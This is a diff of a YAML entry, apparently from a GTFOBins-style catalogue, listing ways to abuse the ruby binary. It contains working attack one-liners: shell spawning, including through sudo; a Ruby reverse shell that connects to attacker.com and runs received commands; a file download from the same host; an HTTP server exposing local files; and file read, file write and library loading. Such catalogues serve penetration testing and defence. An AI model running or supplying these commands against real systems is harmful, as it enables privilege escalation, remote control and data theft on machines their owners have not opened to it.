@@ -1,32 +1,33 @@
 ---
 functions:
   execute-interactive:
-    - code: ruby -e 'exec "/bin/sh"'
-  sudo-enabled:
-    - code: sudo ruby -e 'exec "/bin/sh"'
-  upload:
-    - description: Serve files in the local folder running an HTTP server. This requires version 1.9.2 or later.
-      code: |
-        export LPORT=8888
-        ruby -run -e httpd . -p $LPORT
-  download:
-    - description: Fetch a remote file via HTTP GET request.
-      code: |
-        export RHOST=attacker.com
-        export RPORT=12345
-        export RFILE=/file_to_get
-        export LFILE=file_to_save
-        ruby -e 'require "net/http"; Net::HTTP.start(ENV["RHOST"], ENV["RPORT"]) { |http| r = http.get(ENV["RFILE"]); open(ENV["LFILE"], "wb") { |file| file.write(r.body) } }'
+  - code: ruby -e 'exec "/bin/sh"'
   reverse-shell-interactive:
-    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
-      code: |
-        export RHOST=attacker.com
-        export RPORT=12345
-        ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["RHOST"],ENV["RPORT"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
-  file-read:
-    - code: ruby -e 'puts File.read("file_to_read")'
+  - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
+    code: |
+      export RHOST=attacker.com
+      export RPORT=12345
+      ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["RHOST"],ENV["RPORT"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+  upload:
+  - description: Serve files in the local folder running an HTTP server. This requires
+      version 1.9.2 or later.
+    code: |
+      export LPORT=8888
+      ruby -run -e httpd . -p $LPORT
+  download:
+  - description: Fetch a remote file via HTTP GET request.
+    code: |
+      export RHOST=attacker.com
+      export RPORT=12345
+      export RFILE=/file_to_get
+      export LFILE=file_to_save
+      ruby -e 'require "net/http"; Net::HTTP.start(ENV["RHOST"], ENV["RPORT"]) { |http| r = http.get(ENV["RFILE"]); open(ENV["LFILE"], "wb") { |file| file.write(r.body) } }'
   file-write:
-    - code: ruby -e 'File.open("file_to_write", "w+") { |f| f.write("data") }'
+  - code: ruby -e 'File.open("file_to_write", "w+") { |f| f.write("data") }'
+  file-read:
+  - code: ruby -e 'puts File.read("file_to_read")'
   load-library:
-    - code: ruby -e 'require "fiddle"; Fiddle.dlopen("lib.so")'
+  - code: ruby -e 'require "fiddle"; Fiddle.dlopen("lib.so")'
+  sudo-enabled:
+  - code: sudo ruby -e 'exec "/bin/sh"'
 ---
